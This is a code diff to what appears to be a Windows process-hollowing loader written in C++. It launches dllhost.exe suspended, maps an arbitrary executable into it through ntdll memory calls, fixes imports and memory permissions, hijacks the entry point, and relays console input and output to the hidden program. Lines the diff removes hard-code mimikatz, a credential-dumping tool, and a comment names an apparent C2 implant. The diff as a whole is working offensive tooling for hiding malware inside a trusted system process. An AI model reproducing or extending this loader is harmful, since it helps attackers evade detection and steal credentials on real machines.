@@ -6,7 +6,6 @@
 
 
 _NtWriteVirtualMemory myNtWrite = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
-_NtReadVirtualMemory myNtRead = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtReadVirtualMemory");
 _NtProtectVirtualMemory myNtProtec = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
 _NtAllocateVirtualMemory myNtAlloc = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
 _NtCreateThreadEx myNtThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
@@ -107,8 +106,6 @@ bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, PVOID allocAddrOnTarget, DWO
 }
 
 
-
-
 BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
 {
 	PPEB peb = (PPEB)__readgsqword(0x60);
@@ -134,7 +131,6 @@ BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
 	return FALSE;
 
 }
-
 
 HANDLE getSnapShotProcess(int pid) {
 
@@ -164,8 +160,6 @@ MODULEENTRY32W getModuleEntry(HANDLE snapShotHandle, PWSTR moduleSearched)
 	} while (Module32NextW(snapShotHandle, &me32));
 	return { 0 };
 }
-
-
 
 PVOID getAddrFunction(HMODULE lib, PCHAR functionName, PCHAR& forwardedLib, PCHAR& forwardedName)
 {
@@ -660,6 +654,55 @@ bool fixDelayedImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget
 
 }
 
+BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {
+
+	// Loop through each section of the PE image.
+	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
+
+		// Variables to store the new and old memory protections.
+		DWORD	dwProtection = 0x00,
+			dwOldProtection = 0x00;
+
+		// Skip the section if it has no data or no associated virtual address.
+		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
+			continue;
+
+		// Determine memory protection based on section characteristics.
+		// These characteristics dictate whether the section is readable, writable, executable, etc.
+		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+			dwProtection = PAGE_WRITECOPY;
+
+		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
+			dwProtection = PAGE_READONLY;
+
+		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
+			dwProtection = PAGE_READWRITE;
+
+		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+			dwProtection = PAGE_EXECUTE;
+
+		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+			dwProtection = PAGE_EXECUTE_WRITECOPY;
+
+		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
+			dwProtection = PAGE_EXECUTE_READ;
+
+		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
+			dwProtection = PAGE_EXECUTE_READWRITE;
+
+		// Apply the determined memory protection to the section.
+		PVOID addr = (PBYTE)pPeBaseAddress + pImgSecHdr[i].VirtualAddress;
+		SIZE_T size = pImgSecHdr[i].SizeOfRawData;
+		NTSTATUS status = myNtProtec(hProcess, &addr, (PULONG)&size, dwProtection, &dwOldProtection);
+		if (status != 0) {
+			_err("Failed changing permissions: %x\r\n",status);
+			return FALSE;
+		}
+	}
+
+	return TRUE;
+}
+
 BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myPE, PVOID allocAddrOnTarget)
 {
 	CONTEXT CTX = {};
@@ -697,29 +740,43 @@ BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myP
 	return TRUE;
 }
 
-BOOL retrieveOutPut(HANDLE hThread, HANDLE hStdOut)
+BOOL retrieveOutPut(PIO outStruct)
 {
 	DWORD timeout = 100;
 	PVOID commandOutput = nullptr;
 	DWORD bytesSize = 0;
 	//NTSTATUS status = myNtWaitForSingleObject(hThread, FALSE, PLARGE_INTEGER(&timeout));
-	while (WaitForSingleObject(hThread, 100) != WAIT_OBJECT_0) {
-		readPipe(hStdOut, &commandOutput, &bytesSize);
+	while (WaitForSingleObject(outStruct->hThread, 100) != WAIT_OBJECT_0) {
+		readPipe(outStruct->hStd, &commandOutput, &bytesSize);
 		if (bytesSize > 0)
 		{
 			printf("%s\r\n", commandOutput);
 			DATA_FREE(commandOutput, bytesSize);
 		}
 	}
-
-
 	// Reading output one last time to check we don't leave anything behind...
-	readPipe(hStdOut, &commandOutput, &bytesSize);
+	readPipe(outStruct->hStd, &commandOutput, &bytesSize);
 	if (bytesSize > 0)
 	{
 		printf("%s\r\n", commandOutput);
 	}
 	return TRUE;
+}
+
+VOID writeNamedPipe(PIO input)
+{
+	while (WaitForSingleObject(input->hThread, 100) != WAIT_OBJECT_0) 
+	{
+		char buffer[200];
+		scanf_s("%s", buffer, 198);
+		strcat_s(buffer,200 ,"\n");
+		DWORD byteWritten = 0;
+		if (!WriteFile(input->hStd, buffer, strlen(buffer), &byteWritten, NULL))
+		{
+			printf("%x", GetLastError());
+			exit(1);
+		}
+	}
 }
 
 int main(int argc, char** argv)
@@ -728,16 +785,17 @@ int main(int argc, char** argv)
 	// create destination process - this is the process to be hollowed out
 	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-	//LPCSTR peInject = argv[1];
+	LPCSTR peInject = argv[1];
 	//PCHAR args = argv[2];
 	//LPCSTR peInject = "C:\\Users\\user\\Downloads\\demon.x64.exe";
-	LPCSTR args = "\"coffee\" \"exit\"";
-	LPCSTR peInject = "C:\\Users\\user\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe";
-	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";
+	//LPCSTR args = "\"coffee\" \"exit\"";
+	//LPCSTR peInject = "C:\\Users\\user\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe";
+	LPCSTR target = "C:\\Windows\\System32\\dllhost.exe";
 
 	LPVOID peToInjectContent = NULL;
 
 	HANDLE hStdOut = nullptr;
+	HANDLE hStdIn = nullptr;
 
 	if (!loadPEFromDisk(peInject, peToInjectContent))
 		exit(1);
@@ -750,7 +808,7 @@ int main(int argc, char** argv)
 	}
 		
 
-	if (!launchSuspendedProcess((LPSTR)target, pi, (PCHAR)args, hStdOut))
+	if (!launchSuspendedProcess((LPSTR)target, pi, hStdOut, hStdIn))
 		exit(1);
 
 	LPVOID allocAddrOnTarget = NULL;
@@ -775,11 +833,8 @@ int main(int argc, char** argv)
 	if (!loadImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
 		exit(1);
 
-	
-
 	if (!loadDelayedImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
 		exit(1);
-
 
 	HANDLE mod = getSnapShotProcess(pi->dwProcessId);
 
@@ -791,14 +846,24 @@ int main(int argc, char** argv)
 
 	CloseHandle(mod);
 
+	if (!FixMemPermissionsEx(pi->hProcess, (ULONG_PTR)allocAddrOnTarget, myPE->ntHeader, myPE->sections[0].header))
+		exit(1);
+
 	if (!overwriteEntryPointAndResumeThread(pi, myPE, allocAddrOnTarget))
 		exit(1);
 
-	PVOID output = nullptr;
 	DWORD bytesSize = 0;
-	if (!retrieveOutPut(pi->hThread, hStdOut))
-		exit(1);
+	DWORD threadID = 0;
+	IO outPut = { 0 };
+	outPut.hStd = hStdOut;
+	outPut.hThread = pi->hThread;
+	IO inPut = { 0 };
+	inPut.hStd = hStdIn;
+	inPut.hThread = pi->hThread;
 
+	//retrieveOutPut(&test);
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)retrieveOutPut, &outPut, 0, &threadID);
+	writeNamedPipe(&inPut);
 
 	return 0;
 }
